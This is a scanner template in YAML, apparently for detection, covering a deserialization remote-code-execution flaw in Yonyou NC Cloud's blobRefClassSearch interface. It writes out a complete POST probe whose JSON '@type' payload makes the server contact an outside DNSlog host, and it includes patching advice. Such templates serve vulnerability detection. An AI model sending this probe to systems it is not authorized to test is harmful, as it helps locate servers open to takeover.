app: 用友软件
query: app:"用友软件"
meta:
  name: 用友-nc-cloud-blobRefClassSea反序列化
  level: 5
  tags:
  - remote_code_execution
  description: 用友NCCloud是用友网络科技股份有限公司（简称“用友网络”）推出的一款云端企业管理软件。用友NCCloud提供了全面的企业管理功能，包括财务管理、人力资源管理、供应链管理、采购管理、销售管理等。支持多种业务模式，适用于不同行业和企业规模的需求，帮助企业实现数字化转型和云端化管理。其blobRefClassSearch接口存在反序列化漏洞,恶意攻击者能直接利用其执行命令,获取服务器权限.
  homepage: https://www.yonyou.com/
  author: 院长
  references: https://mp.weixin.qq.com/s/lrOHdXMoAhwqX2TLyFZEBw
  solution: 官方已发布安全补丁，建议联系厂商打补丁或升级版本。
  create_at: "2024-07-29 01:16:54"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /ncchr/pm/ref/indiIssued/blobRefClassSearch
          redirect: true
          header:
          - Content-Type: application/json
          - Connection: close
          - Cache-Control: max-age=0
          - Upgrade-Insecure-Requests: "1"
          - Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
          - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
              (KHTML, like Gecko) Chrome/125.0.4103.116 Safari/537.36
          - Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
          - Content-Length: "120"
          params: |-
            {
              "clientParam": "{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"6sdxf86a.dnslog.pw\"}}}"
            }
        response:
        - name: code
          value: "500"
          type: equals
        - name: body
          value: java
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
